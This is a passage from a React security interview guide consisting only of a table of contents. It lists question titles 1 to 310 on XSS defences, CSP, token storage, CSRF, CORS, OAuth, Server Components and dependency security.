# React Security Interview Questions and Answers

_Last updated: November 13, 2026_

This file has 450 interview questions and answers about security in React apps: 150 easy, 150 moderate and 150 advanced. It covers XSS, authentication and tokens, CSRF, CORS, SSR and React Server Components, secrets in bundles, supply chain risks and security testing. The answers target React 19 (19.3 at the time of writing), React Router v7/v8 and Next.js App Router, and mention older approaches only where you will still see them in real projects.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is XSS?](#1-what-is-xss)
- [2: How does React protect you from XSS by default?](#2-how-does-react-protect-you-from-xss-by-default)
- [3: What exactly does JSX auto-escaping cover?](#3-what-exactly-does-jsx-auto-escaping-cover)
- [4: What are the limits of JSX auto-escaping?](#4-what-are-the-limits-of-jsx-auto-escaping)
- [5: What is dangerouslySetInnerHTML?](#5-what-is-dangerouslysetinnerhtml)
- [6: Why does React give dangerouslySetInnerHTML such a long and scary name?](#6-why-does-react-give-dangerouslysetinnerhtml-such-a-long-and-scary-name)
- [7: What is DOMPurify?](#7-what-is-dompurify)
- [8: How do you use DOMPurify with dangerouslySetInnerHTML?](#8-how-do-you-use-dompurify-with-dangerouslysetinnerhtml)
- [9: What is a javascript: URL?](#9-what-is-a-javascript-url)
- [10: How does React 19 handle javascript: URLs?](#10-how-does-react-19-handle-javascript-urls)
- [11: Is it safe to put user input into an href in React 19?](#11-is-it-safe-to-put-user-input-into-an-href-in-react-19)
- [12: What is props spreading?](#12-what-is-props-spreading)
- [13: Why is spreading user-controlled objects into props risky?](#13-why-is-spreading-user-controlled-objects-into-props-risky)
- [14: What are refs in React?](#14-what-are-refs-in-react)
- [15: Why is setting innerHTML through a ref risky?](#15-why-is-setting-innerhtml-through-a-ref-risky)
- [16: What is Content Security Policy (CSP)?](#16-what-is-content-security-policy-csp)
- [17: How can you set a CSP for a React app?](#17-how-can-you-set-a-csp-for-a-react-app)
- [18: What is a CSP nonce?](#18-what-is-a-csp-nonce)
- [19: What does 'unsafe-inline' mean in CSP?](#19-what-does-unsafe-inline-mean-in-csp)
- [20: What are Trusted Types?](#20-what-are-trusted-types)
- [21: Why can markdown renderers cause XSS?](#21-why-can-markdown-renderers-cause-xss)
- [22: Is react-markdown safe by default?](#22-is-react-markdown-safe-by-default)
- [23: What is a JWT?](#23-what-is-a-jwt)
- [24: What are the three parts of a JWT?](#24-what-are-the-three-parts-of-a-jwt)
- [25: Is the payload of a JWT encrypted?](#25-is-the-payload-of-a-jwt-encrypted)
- [26: Where can a React app store an auth token?](#26-where-can-a-react-app-store-an-auth-token)
- [27: Why is storing tokens in localStorage considered risky?](#27-why-is-storing-tokens-in-localstorage-considered-risky)
- [28: What is an httpOnly cookie?](#28-what-is-an-httponly-cookie)
- [29: What does the Secure attribute on a cookie do?](#29-what-does-the-secure-attribute-on-a-cookie-do)
- [30: What is CSRF?](#30-what-is-csrf)
- [31: What is the SameSite cookie attribute?](#31-what-is-the-samesite-cookie-attribute)
- [32: What are the possible SameSite values?](#32-what-are-the-possible-samesite-values)
- [33: What is an anti-CSRF token?](#33-what-is-an-anti-csrf-token)
- [34: What is a protected route in React?](#34-what-is-a-protected-route-in-react)
- [35: Can a client-side route guard keep data secure?](#35-can-a-client-side-route-guard-keep-data-secure)
- [36: How do you redirect an unauthenticated user with React Router?](#36-how-do-you-redirect-an-unauthenticated-user-with-react-router)
- [37: What is role-based UI rendering?](#37-what-is-role-based-ui-rendering)
- [38: Why is hiding a button not the same as authorization?](#38-why-is-hiding-a-button-not-the-same-as-authorization)
- [39: What is the difference between authentication and authorization?](#39-what-is-the-difference-between-authentication-and-authorization)
- [40: What is OAuth 2.0?](#40-what-is-oauth-20)
- [41: What is OpenID Connect (OIDC)?](#41-what-is-openid-connect-oidc)
- [42: What is PKCE?](#42-what-is-pkce)
- [43: Why is the OAuth implicit flow no longer recommended?](#43-why-is-the-oauth-implicit-flow-no-longer-recommended)
- [44: What is the difference between an access token and an ID token?](#44-what-is-the-difference-between-an-access-token-and-an-id-token)
- [45: What is a refresh token?](#45-what-is-a-refresh-token)
- [46: What is silent token refresh?](#46-what-is-silent-token-refresh)
- [47: What is an auth context in React?](#47-what-is-an-auth-context-in-react)
- [48: What is an HTTP interceptor?](#48-what-is-an-http-interceptor)
- [49: What is the difference between a 401 and a 403 response?](#49-what-is-the-difference-between-a-401-and-a-403-response)
- [50: What is CORS?](#50-what-is-cors)
- [51: Does CORS protect your API from attackers?](#51-does-cors-protect-your-api-from-attackers)
- [52: What is a CORS preflight request?](#52-what-is-a-cors-preflight-request)
- [53: What does credentials: 'include' do in fetch?](#53-what-does-credentials-include-do-in-fetch)
- [54: What is an open redirect?](#54-what-is-an-open-redirect)
- [55: What is the difference between client-side and server-side validation?](#55-what-is-the-difference-between-client-side-and-server-side-validation)
- [56: What is Zod?](#56-what-is-zod)
- [57: What is React Hook Form?](#57-what-is-react-hook-form)
- [58: Why does server-side rendering bring new security concerns?](#58-why-does-server-side-rendering-bring-new-security-concerns)
- [59: What is hydration state leakage?](#59-what-is-hydration-state-leakage)
- [60: Why is JSON.stringify inside a script tag unsafe?](#60-why-is-jsonstringify-inside-a-script-tag-unsafe)
- [61: What are React Server Components, from a security point of view?](#61-what-are-react-server-components-from-a-security-point-of-view)
- [62: What are Server Functions (Server Actions)?](#62-what-are-server-functions-server-actions)
- [63: Are Server Actions public endpoints?](#63-are-server-actions-public-endpoints)
- [64: What is the server-only package?](#64-what-is-the-server-only-package)
- [65: How do environment variables work in a front-end React app?](#65-how-do-environment-variables-work-in-a-front-end-react-app)
- [66: What does the VITE_ prefix mean?](#66-what-does-the-vite_-prefix-mean)
- [67: What does the NEXT_PUBLIC_ prefix mean in Next.js?](#67-what-does-the-next_public_-prefix-mean-in-nextjs)
- [68: Can you hide an API key in a React app?](#68-can-you-hide-an-api-key-in-a-react-app)
- [69: What are source maps?](#69-what-are-source-maps)
- [70: Should you publish source maps in production?](#70-should-you-publish-source-maps-in-production)
- [71: What is clickjacking?](#71-what-is-clickjacking)
- [72: What is the X-Frame-Options header?](#72-what-is-the-x-frame-options-header)
- [73: What does the CSP frame-ancestors directive do?](#73-what-does-the-csp-frame-ancestors-directive-do)
- [74: What is Subresource Integrity (SRI)?](#74-what-is-subresource-integrity-sri)
- [75: How do you add SRI to a script tag?](#75-how-do-you-add-sri-to-a-script-tag)
- [76: Why does SRI need the crossorigin attribute?](#76-why-does-sri-need-the-crossorigin-attribute)
- [77: What is window.postMessage?](#77-what-is-windowpostmessage)
- [78: Why do you need to check event.origin when receiving messages?](#78-why-do-you-need-to-check-eventorigin-when-receiving-messages)
- [79: What is the iframe sandbox attribute?](#79-what-is-the-iframe-sandbox-attribute)
- [80: What is a supply chain attack?](#80-what-is-a-supply-chain-attack)
- [81: What does npm audit do?](#81-what-does-npm-audit-do)
- [82: What is a lockfile and why should you commit it?](#82-what-is-a-lockfile-and-why-should-you-commit-it)
- [83: What is typosquatting in npm?](#83-what-is-typosquatting-in-npm)
- [84: What is the difference between npm ci and npm install?](#84-what-is-the-difference-between-npm-ci-and-npm-install)
- [85: What are error boundaries?](#85-what-are-error-boundaries)
- [86: Why should you not show raw error messages to users?](#86-why-should-you-not-show-raw-error-messages-to-users)
- [87: What can a user see with React DevTools?](#87-what-can-a-user-see-with-react-devtools)
- [88: Is data in a Redux or Zustand store secret?](#88-is-data-in-a-redux-or-zustand-store-secret)
- [89: What is the OWASP Top 10?](#89-what-is-the-owasp-top-10)
- [90: Which OWASP Top 10 (2025) categories matter most for React apps?](#90-which-owasp-top-10-2025-categories-matter-most-for-react-apps)
- [91: Why must a React app be served over HTTPS?](#91-why-must-a-react-app-be-served-over-https)
- [92: Which security headers should a React app send?](#92-which-security-headers-should-a-react-app-send)
- [93: What is HSTS?](#93-what-is-hsts)
- [94: What does X-Content-Type-Options: nosniff do?](#94-what-does-x-content-type-options-nosniff-do)
- [95: What is Referrer-Policy and why does it matter?](#95-what-is-referrer-policy-and-why-does-it-matter)
- [96: Why use rel="noopener noreferrer" on external links?](#96-why-use-relnoopener-noreferrer-on-external-links)
- [97: Do modern browsers still need rel="noopener" for target="_blank"?](#97-do-modern-browsers-still-need-relnoopener-for-target_blank)
- [98: What is DOM-based XSS?](#98-what-is-dom-based-xss)
- [99: What is the difference between stored and reflected XSS?](#99-what-is-the-difference-between-stored-and-reflected-xss)
- [100: Can URL parameters cause XSS in a React app?](#100-can-url-parameters-cause-xss-in-a-react-app)
- [101: What is the difference between escaping, sanitizing and validating?](#101-what-is-the-difference-between-escaping-sanitizing-and-validating)
- [102: Why are eval and new Function dangerous?](#102-why-are-eval-and-new-function-dangerous)
- [103: Is the style prop in React a security risk?](#103-is-the-style-prop-in-react-a-security-risk)
- [104: Can className be used for injection?](#104-can-classname-be-used-for-injection)
- [105: Why should you not render a component type chosen by the user?](#105-why-should-you-not-render-a-component-type-chosen-by-the-user)
- [106: What is the difference between a session cookie and a JWT-based session?](#106-what-is-the-difference-between-a-session-cookie-and-a-jwt-based-session)
- [107: How does logout work when you use JWTs?](#107-how-does-logout-work-when-you-use-jwts)
- [108: What is the exp claim in a JWT?](#108-what-is-the-exp-claim-in-a-jwt)
- [109: Should the React app verify the JWT signature?](#109-should-the-react-app-verify-the-jwt-signature)
- [110: What is jwt-decode used for?](#110-what-is-jwt-decode-used-for)
- [111: What is the Backend for Frontend (BFF) pattern?](#111-what-is-the-backend-for-frontend-bff-pattern)
- [112: What is the Auth0 React SDK?](#112-what-is-the-auth0-react-sdk)
- [113: What is MSAL React?](#113-what-is-msal-react)
- [114: What is Auth.js (NextAuth)?](#114-what-is-authjs-nextauth)
- [115: What does a typical useAuth hook return?](#115-what-does-a-typical-useauth-hook-return)
- [116: Why must rate limiting be done on the server?](#116-why-must-rate-limiting-be-done-on-the-server)
- [117: Why is console.log a risk in production?](#117-why-is-consolelog-a-risk-in-production)
- [118: What counts as sensitive data in a front-end app?](#118-what-counts-as-sensitive-data-in-a-front-end-app)
- [119: Should you store personal data in localStorage?](#119-should-you-store-personal-data-in-localstorage)
- [120: Is sessionStorage safer than localStorage for tokens?](#120-is-sessionstorage-safer-than-localstorage-for-tokens)
- [121: How should you use the autocomplete attribute on sensitive fields?](#121-how-should-you-use-the-autocomplete-attribute-on-sensitive-fields)
- [122: Is a "show password" toggle safe?](#122-is-a-show-password-toggle-safe)
- [123: What is mixed content?](#123-what-is-mixed-content)
- [124: Why are third-party scripts a security risk?](#124-why-are-third-party-scripts-a-security-risk)
- [125: How does least privilege apply to front-end keys and tokens?](#125-how-does-least-privilege-apply-to-front-end-keys-and-tokens)
- [126: What are common security misconfigurations in React apps?](#126-what-are-common-security-misconfigurations-in-react-apps)
- [127: What are Dependabot and Renovate?](#127-what-are-dependabot-and-renovate)
- [128: What is a CVE?](#128-what-is-a-cve)
- [129: What was the React2Shell vulnerability?](#129-what-was-the-react2shell-vulnerability)
- [130: Which ESLint rules help with React security?](#130-which-eslint-rules-help-with-react-security)
- [131: Is the accept attribute on a file input a security check?](#131-is-the-accept-attribute-on-a-file-input-a-security-check)
- [132: Why are user-uploaded SVG files risky?](#132-why-are-user-uploaded-svg-files-risky)
- [133: Why use the URL constructor to check URLs?](#133-why-use-the-url-constructor-to-check-urls)
- [134: Why use encodeURIComponent when building URLs?](#134-why-use-encodeuricomponent-when-building-urls)
- [135: Where does CAPTCHA fit in a React app?](#135-where-does-captcha-fit-in-a-react-app)
- [136: What is MFA from the front-end point of view?](#136-what-is-mfa-from-the-front-end-point-of-view)
- [137: What is the Permissions-Policy header?](#137-what-is-the-permissions-policy-header)
- [138: What is Cross-Origin-Opener-Policy (COOP)?](#138-what-is-cross-origin-opener-policy-coop)
- [139: What is window.opener and why can it be dangerous?](#139-what-is-windowopener-and-why-can-it-be-dangerous)
- [140: Are TypeScript and PropTypes security features?](#140-are-typescript-and-proptypes-security-features)
- [141: What are SAST and DAST?](#141-what-are-sast-and-dast)
- [142: What is penetration testing?](#142-what-is-penetration-testing)
- [143: What does "never trust the client" mean?](#143-what-does-never-trust-the-client-mean)
- [144: Where should secrets live in a React project?](#144-where-should-secrets-live-in-a-react-project)
- [145: Why is putting tokens in URL query strings a bad idea?](#145-why-is-putting-tokens-in-url-query-strings-a-bad-idea)
- [146: What is the state parameter in OAuth?](#146-what-is-the-state-parameter-in-oauth)
- [147: What is the nonce parameter in OIDC?](#147-what-is-the-nonce-parameter-in-oidc)
- [148: Why is user-defined CSS risky?](#148-why-is-user-defined-css-risky)
- [149: What does "defense in depth" mean for React apps?](#149-what-does-defense-in-depth-mean-for-react-apps)
- [150: What should a basic security checklist for a new React app include?](#150-what-should-a-basic-security-checklist-for-a-new-react-app-include)

### Moderate Questions (151-300)

- [151: How do you limit which tags and attributes DOMPurify allows?](#151-how-do-you-limit-which-tags-and-attributes-dompurify-allows)
- [152: How would you build a reusable SafeHtml component?](#152-how-would-you-build-a-reusable-safehtml-component)
- [153: How do you use DOMPurify during server-side rendering?](#153-how-do-you-use-dompurify-during-server-side-rendering)
- [154: How can you force all sanitized links to open safely with DOMPurify hooks?](#154-how-can-you-force-all-sanitized-links-to-open-safely-with-dompurify-hooks)
- [155: How do you validate a user-provided URL before using it in href?](#155-how-do-you-validate-a-user-provided-url-before-using-it-in-href)
- [156: Which props does React 19 protect against javascript: URLs, and what does it not cover?](#156-which-props-does-react-19-protect-against-javascript-urls-and-what-does-it-not-cover)
- [157: Are data: URLs dangerous in React apps?](#157-are-data-urls-dangerous-in-react-apps)
- [158: How do you make props spreading safe in a wrapper component?](#158-how-do-you-make-props-spreading-safe-in-a-wrapper-component)
- [159: Give an example of how spreading API data into a component leads to XSS.](#159-give-an-example-of-how-spreading-api-data-into-a-component-leads-to-xss)
- [160: How do you safely change DOM text through a ref?](#160-how-do-you-safely-change-dom-text-through-a-ref)
- [161: What are the risks of using non-React DOM libraries through refs?](#161-what-are-the-risks-of-using-non-react-dom-libraries-through-refs)
- [162: Which DOM APIs should you avoid with user data inside effects?](#162-which-dom-apis-should-you-avoid-with-user-data-inside-effects)
- [163: How do you add a CSP to a Vite React SPA?](#163-how-do-you-add-a-csp-to-a-vite-react-spa)
- [164: How do you add a nonce-based CSP in Next.js?](#164-how-do-you-add-a-nonce-based-csp-in-nextjs)
- [165: How do you give your own script tags a nonce in React?](#165-how-do-you-give-your-own-script-tags-a-nonce-in-react)
- [166: How do CSS-in-JS libraries conflict with a strict CSP?](#166-how-do-css-in-js-libraries-conflict-with-a-strict-csp)
- [167: Why do static CSS tools make CSP easier?](#167-why-do-static-css-tools-make-csp-easier)
- [168: What is CSP report-only mode?](#168-what-is-csp-report-only-mode)
- [169: What does 'strict-dynamic' do in a CSP?](#169-what-does-strict-dynamic-do-in-a-csp)
- [170: How do you create a Trusted Types policy?](#170-how-do-you-create-a-trusted-types-policy)
- [171: What is the Trusted Types default policy?](#171-what-is-the-trusted-types-default-policy)
- [172: How do you allow HTML in react-markdown safely?](#172-how-do-you-allow-html-in-react-markdown-safely)
- [173: How do you safely render markdown with a library that outputs HTML strings?](#173-how-do-you-safely-render-markdown-with-a-library-that-outputs-html-strings)
- [174: How do you control link and image URLs in react-markdown?](#174-how-do-you-control-link-and-image-urls-in-react-markdown)
- [175: How do you check a third-party React component for security problems?](#175-how-do-you-check-a-third-party-react-component-for-security-problems)
- [176: How do you handle HTML output from rich text editors like TipTap, Lexical or Quill?](#176-how-do-you-handle-html-output-from-rich-text-editors-like-tiptap-lexical-or-quill)
- [177: How does the "access token in memory, refresh token in httpOnly cookie" pattern work?](#177-how-does-the-access-token-in-memory-refresh-token-in-httponly-cookie-pattern-work)
- [178: How would you write an auth provider that keeps the access token in memory?](#178-how-would-you-write-an-auth-provider-that-keeps-the-access-token-in-memory)
- [179: How do you attach an access token with an axios request interceptor?](#179-how-do-you-attach-an-access-token-with-an-axios-request-interceptor)
- [180: How do you refresh the token and retry the request on a 401 with axios?](#180-how-do-you-refresh-the-token-and-retry-the-request-on-a-401-with-axios)
- [181: How do you handle 401s with fetch instead of axios?](#181-how-do-you-handle-401s-with-fetch-instead-of-axios)
- [182: How do you avoid infinite refresh loops?](#182-how-do-you-avoid-infinite-refresh-loops)
- [183: What is refresh token rotation?](#183-what-is-refresh-token-rotation)
- [184: What does it mean that Chrome defaults cookies to SameSite=Lax?](#184-what-does-it-mean-that-chrome-defaults-cookies-to-samesitelax)
- [185: What is the double submit cookie pattern?](#185-what-is-the-double-submit-cookie-pattern)
- [186: How does the synchronizer token pattern work in an SPA?](#186-how-does-the-synchronizer-token-pattern-work-in-an-spa)
- [187: Can a custom request header protect against CSRF?](#187-can-a-custom-request-header-protect-against-csrf)
- [188: How does axios help with CSRF tokens?](#188-how-does-axios-help-with-csrf-tokens)
- [189: How do you protect routes with React Router loaders?](#189-how-do-you-protect-routes-with-react-router-loaders)
- [190: How do you use React Router middleware for auth?](#190-how-do-you-use-react-router-middleware-for-auth)
- [191: How do you write a RequireAuth route guard component?](#191-how-do-you-write-a-requireauth-route-guard-component)
- [192: What is the "flash of protected content" problem and how do you avoid it?](#192-what-is-the-flash-of-protected-content-problem-and-how-do-you-avoid-it)
- [193: How would you build a permission hook for role-based UI?](#193-how-would-you-build-a-permission-hook-for-role-based-ui)
- [194: What does server-side enforcement look like for a delete action?](#194-what-does-server-side-enforcement-look-like-for-a-delete-action)
- [195: Does code splitting hide admin pages from regular users?](#195-does-code-splitting-hide-admin-pages-from-regular-users)
- [196: How do you set up Auth0 in a React SPA?](#196-how-do-you-set-up-auth0-in-a-react-spa)
- [197: What do cacheLocation and useRefreshTokens do in the Auth0 React SDK?](#197-what-do-cachelocation-and-userefreshtokens-do-in-the-auth0-react-sdk)
- [198: How do you get a token silently with MSAL React?](#198-how-do-you-get-a-token-silently-with-msal-react)
- [199: Which cache locations does MSAL support, and which should you pick?](#199-which-cache-locations-does-msal-support-and-which-should-you-pick)
- [200: How do you set up Auth.js (NextAuth v5) in the Next.js App Router?](#200-how-do-you-set-up-authjs-nextauth-v5-in-the-nextjs-app-router)
- [201: What is the difference between the JWT and database session strategies in Auth.js?](#201-what-is-the-difference-between-the-jwt-and-database-session-strategies-in-authjs)
- [202: Walk through the authorization code flow with PKCE in a SPA.](#202-walk-through-the-authorization-code-flow-with-pkce-in-a-spa)
- [203: How do you generate a PKCE code challenge in the browser?](#203-how-do-you-generate-a-pkce-code-challenge-in-the-browser)
- [204: How do you log out properly in an OIDC-based React app?](#204-how-do-you-log-out-properly-in-an-oidc-based-react-app)
- [205: How do you sync logout across browser tabs?](#205-how-do-you-sync-logout-across-browser-tabs)
- [206: How do you implement an idle timeout in a React app?](#206-how-do-you-implement-an-idle-timeout-in-a-react-app)
- [207: How do you debug a CORS error from a React app?](#207-how-do-you-debug-a-cors-error-from-a-react-app)
- [208: Why can't you use Access-Control-Allow-Origin: * with credentials?](#208-why-cant-you-use-access-control-allow-origin--with-credentials)
- [209: How do you avoid CORS problems in development with Vite?](#209-how-do-you-avoid-cors-problems-in-development-with-vite)
- [210: How do you safely handle a returnTo parameter after login?](#210-how-do-you-safely-handle-a-returnto-parameter-after-login)
- [211: How do you combine React Hook Form with Zod?](#211-how-do-you-combine-react-hook-form-with-zod)
- [212: How do you share a validation schema between client and server?](#212-how-do-you-share-a-validation-schema-between-client-and-server)
- [213: How do you prevent mass assignment with schema validation?](#213-how-do-you-prevent-mass-assignment-with-schema-validation)
- [214: Why validate API responses on the client?](#214-why-validate-api-responses-on-the-client)
- [215: How do you safely serialize initial state into server-rendered HTML?](#215-how-do-you-safely-serialize-initial-state-into-server-rendered-html)
- [216: What data from Server Components ends up in the browser?](#216-what-data-from-server-components-ends-up-in-the-browser)
- [217: How do you avoid leaking full objects to Client Components?](#217-how-do-you-avoid-leaking-full-objects-to-client-components)
- [218: How do you add auth checks inside a Server Action?](#218-how-do-you-add-auth-checks-inside-a-server-action)
- [219: How do you validate inputs in a Server Action?](#219-how-do-you-validate-inputs-in-a-server-action)
- [220: How should Server Actions return errors?](#220-how-should-server-actions-return-errors)
- [221: How does useActionState help with Server Action errors?](#221-how-does-useactionstate-help-with-server-action-errors)
- [222: How do you use the server-only package in practice?](#222-how-do-you-use-the-server-only-package-in-practice)
- [223: What is the client-only package?](#223-what-is-the-client-only-package)
- [224: What is the Data Access Layer pattern recommended for Next.js?](#224-what-is-the-data-access-layer-pattern-recommended-for-nextjs)
- [225: What are React's taint APIs?](#225-what-are-reacts-taint-apis)
- [226: How does Next.js handle environment variables on the server and client?](#226-how-does-nextjs-handle-environment-variables-on-the-server-and-client)
- [227: What can go wrong with Vite's envPrefix and loadEnv?](#227-what-can-go-wrong-with-vites-envprefix-and-loadenv)
- [228: What is the difference between build-time and runtime config in a React app?](#228-what-is-the-difference-between-build-time-and-runtime-config-in-a-react-app)
- [229: How do you check that no secrets ended up in your bundle?](#229-how-do-you-check-that-no-secrets-ended-up-in-your-bundle)
- [230: How should you handle .env files in a React project?](#230-how-should-you-handle-env-files-in-a-react-project)
- [231: What are hidden source maps and how do you use them with an error tracker?](#231-what-are-hidden-source-maps-and-how-do-you-use-them-with-an-error-tracker)
- [232: How do source maps work in Next.js production builds?](#232-how-do-source-maps-work-in-nextjs-production-builds)
- [233: How do you set clickjacking protection headers in Next.js?](#233-how-do-you-set-clickjacking-protection-headers-in-nextjs)
- [234: Why is JavaScript frame-busting code a weak clickjacking defense?](#234-why-is-javascript-frame-busting-code-a-weak-clickjacking-defense)
- [235: How do you generate an SRI hash?](#235-how-do-you-generate-an-sri-hash)
- [236: Can bundlers add SRI to your own chunks?](#236-can-bundlers-add-sri-to-your-own-chunks)
- [237: How do you send messages safely with postMessage?](#237-how-do-you-send-messages-safely-with-postmessage)
- [238: How do you receive postMessage events safely in a React component?](#238-how-do-you-receive-postmessage-events-safely-in-a-react-component)
- [239: Why must you validate the data in a postMessage event even after checking origin?](#239-why-must-you-validate-the-data-in-a-postmessage-event-even-after-checking-origin)
- [240: Why is combining allow-scripts and allow-same-origin in iframe sandbox dangerous?](#240-why-is-combining-allow-scripts-and-allow-same-origin-in-iframe-sandbox-dangerous)
- [241: What does the iframe allow attribute do?](#241-what-does-the-iframe-allow-attribute-do)
- [242: How do you use npm audit without drowning in noise?](#242-how-do-you-use-npm-audit-without-drowning-in-noise)
- [243: Why run npm ci with --ignore-scripts in CI?](#243-why-run-npm-ci-with---ignore-scripts-in-ci)
- [244: What are the trade-offs of pinning exact dependency versions?](#244-what-are-the-trade-offs-of-pinning-exact-dependency-versions)
- [245: How would you configure Renovate or Dependabot for a React project?](#245-how-would-you-configure-renovate-or-dependabot-for-a-react-project)
- [246: What should you look for when reviewing lockfile changes?](#246-what-should-you-look-for-when-reviewing-lockfile-changes)
- [247: What do tools like Snyk and Socket add on top of npm audit?](#247-what-do-tools-like-snyk-and-socket-add-on-top-of-npm-audit)
- [248: How do you write an error boundary that hides details but logs them?](#248-how-do-you-write-an-error-boundary-that-hides-details-but-logs-them)
- [249: What do React 19's root error options do?](#249-what-do-react-19s-root-error-options-do)
- [250: How do you scrub sensitive data before sending errors to Sentry?](#250-how-do-you-scrub-sensitive-data-before-sending-errors-to-sentry)
- [251: How do error pages work in the Next.js App Router, and what do they show in production?](#251-how-do-error-pages-work-in-the-nextjs-app-router-and-what-do-they-show-in-production)
- [252: Can you hide data from React DevTools in production?](#252-can-you-hide-data-from-react-devtools-in-production)
- [253: How do you turn off Redux DevTools in production?](#253-how-do-you-turn-off-redux-devtools-in-production)
- [254: What should you watch out for when persisting state with redux-persist or Zustand persist?](#254-what-should-you-watch-out-for-when-persisting-state-with-redux-persist-or-zustand-persist)
- [255: Why should you clear the TanStack Query cache on logout?](#255-why-should-you-clear-the-tanstack-query-cache-on-logout)
- [256: What should you reset in the app state when a user logs out?](#256-what-should-you-reset-in-the-app-state-when-a-user-logs-out)
- [257: How do you test that a component does not render HTML from user input?](#257-how-do-you-test-that-a-component-does-not-render-html-from-user-input)
- [258: How do you set up ESLint security rules for a React project?](#258-how-do-you-set-up-eslint-security-rules-for-a-react-project)
- [259: How can you use OWASP ZAP against a React app?](#259-how-can-you-use-owasp-zap-against-a-react-app)
- [260: How do you check a deployed app's security headers?](#260-how-do-you-check-a-deployed-apps-security-headers)
- [261: How do you test access control with Playwright?](#261-how-do-you-test-access-control-with-playwright)
- [262: How should a React app handle file uploads securely?](#262-how-should-a-react-app-handle-file-uploads-securely)
- [263: How do you safely show images that users uploaded?](#263-how-do-you-safely-show-images-that-users-uploaded)
- [264: How do you build query strings safely in React?](#264-how-do-you-build-query-strings-safely-in-react)
- [265: What is client-side path traversal in API calls?](#265-what-is-client-side-path-traversal-in-api-calls)
- [266: How do you handle external links with React Router or Next.js Link components?](#266-how-do-you-handle-external-links-with-react-router-or-nextjs-link-components)
- [267: Why is assigning user input to window.location dangerous?](#267-why-is-assigning-user-input-to-windowlocation-dangerous)
- [268: Why should values from useSearchParams or useParams be treated as untrusted?](#268-why-should-values-from-usesearchparams-or-useparams-be-treated-as-untrusted)
- [269: How can you show untrusted HTML, like an email, without risking your app?](#269-how-can-you-show-untrusted-html-like-an-email-without-risking-your-app)
- [270: Should CMS content be treated as trusted HTML?](#270-should-cms-content-be-treated-as-trusted-html)
- [271: How do you show translations that contain HTML safely in react-i18next?](#271-how-do-you-show-translations-that-contain-html-safely-in-react-i18next)
- [272: How can toast, tooltip or chart libraries introduce XSS?](#272-how-can-toast-tooltip-or-chart-libraries-introduce-xss)
- [273: Why should dynamic import paths never come from user input?](#273-why-should-dynamic-import-paths-never-come-from-user-input)
- [274: How do you render JSON-LD structured data safely in React?](#274-how-do-you-render-json-ld-structured-data-safely-in-react)
- [275: How do analytics and tag managers fit into a strict CSP?](#275-how-do-analytics-and-tag-managers-fit-into-a-strict-csp)
- [276: What does a well-configured auth cookie look like?](#276-what-does-a-well-configured-auth-cookie-look-like)
- [277: What do the __Host- and __Secure- cookie prefixes do?](#277-what-do-the-__host--and-__secure--cookie-prefixes-do)
- [278: How do cookie Domain and Path affect security?](#278-how-do-cookie-domain-and-path-affect-security)
- [279: What are the trade-offs between sending tokens in the Authorization header and using cookies?](#279-what-are-the-trade-offs-between-sending-tokens-in-the-authorization-header-and-using-cookies)
- [280: How do you schedule a token refresh before expiry?](#280-how-do-you-schedule-a-token-refresh-before-expiry)
- [281: Why does clock skew matter for token expiry on the client?](#281-why-does-clock-skew-matter-for-token-expiry-on-the-client)
- [282: How should the UI handle a 403 response?](#282-how-should-the-ui-handle-a-403-response)
- [283: How should the UI handle 429 Too Many Requests?](#283-how-should-the-ui-handle-429-too-many-requests)
- [284: How do you avoid user enumeration in login and reset forms?](#284-how-do-you-avoid-user-enumeration-in-login-and-reset-forms)
- [285: What front-end mistakes are common in password reset flows?](#285-what-front-end-mistakes-are-common-in-password-reset-flows)
- [286: How do you secure WebSocket connections from a React app?](#286-how-do-you-secure-websocket-connections-from-a-react-app)
- [287: What security issues come with service workers in React apps?](#287-what-security-issues-come-with-service-workers-in-react-apps)
- [288: Why should sensitive API responses use Cache-Control: no-store?](#288-why-should-sensitive-api-responses-use-cache-control-no-store)
- [289: How should you handle the clipboard with sensitive data?](#289-how-should-you-handle-the-clipboard-with-sensitive-data)
- [290: Why can Storybook or preview deployments be a security risk?](#290-why-can-storybook-or-preview-deployments-be-a-security-risk)
- [291: How can build configuration leak details across environments?](#291-how-can-build-configuration-leak-details-across-environments)
- [292: Why are debug or test-only routes dangerous in production?](#292-why-are-debug-or-test-only-routes-dangerous-in-production)
- [293: What would you check in a security code review of a React pull request?](#293-what-would-you-check-in-a-security-code-review-of-a-react-pull-request)
- [294: How do you validate a Server Action's FormData file upload?](#294-how-do-you-validate-a-server-actions-formdata-file-upload)
- [295: How do you configure allowed origins for Server Actions behind a proxy?](#295-how-do-you-configure-allowed-origins-for-server-actions-behind-a-proxy)
- [296: How do you mask sensitive inputs in session replay tools?](#296-how-do-you-mask-sensitive-inputs-in-session-replay-tools)
- [297: How do you check that your CSP works before enforcing it?](#297-how-do-you-check-that-your-csp-works-before-enforcing-it)
- [298: What is the difference between X-XSS-Protection and CSP?](#298-what-is-the-difference-between-x-xss-protection-and-csp)
- [299: Why should a React app not use the Referer header or document.referrer for security decisions?](#299-why-should-a-react-app-not-use-the-referer-header-or-documentreferrer-for-security-decisions)
- [300: How would you explain the "shared responsibility" between React and the developer for security?](#300-how-would-you-explain-the-shared-responsibility-between-react-and-the-developer-for-security)

### Advanced Questions (301-450)

- [301: How does React escape values internally, and why does context still matter?](#301-how-does-react-escape-values-internally-and-why-does-context-still-matter)
- [302: What is mutation XSS (mXSS) and why does it matter for sanitizers?](#302-what-is-mutation-xss-mxss-and-why-does-it-matter-for-sanitizers)
- [303: Should you sanitize HTML when it is saved or when it is shown?](#303-should-you-sanitize-html-when-it-is-saved-or-when-it-is-shown)
- [304: How do you combine DOMPurify, Trusted Types and React?](#304-how-do-you-combine-dompurify-trusted-types-and-react)
- [305: How would you roll out Trusted Types in a large existing React app?](#305-how-would-you-roll-out-trusted-types-in-a-large-existing-react-app)
- [306: How do you build a strict CSP for a static SPA hosted on a CDN?](#306-how-do-you-build-a-strict-csp-for-a-static-spa-hosted-on-a-cdn)
- [307: What are the trade-offs between CSP nonces and hashes?](#307-what-are-the-trade-offs-between-csp-nonces-and-hashes)
- [308: Why does a nonce-based CSP force dynamic rendering in Next.js?](#308-why-does-a-nonce-based-csp-force-dynamic-rendering-in-nextjs)
- [309: How do inline style attributes from SSR interact with a strict style-src?](#309-how-do-inline-style-attributes-from-ssr-interact-with-a-strict-style-src)
- [310: How can CSS injection be used to steal data?](#310-how-can-css-injection-be-used-to-steal-data)
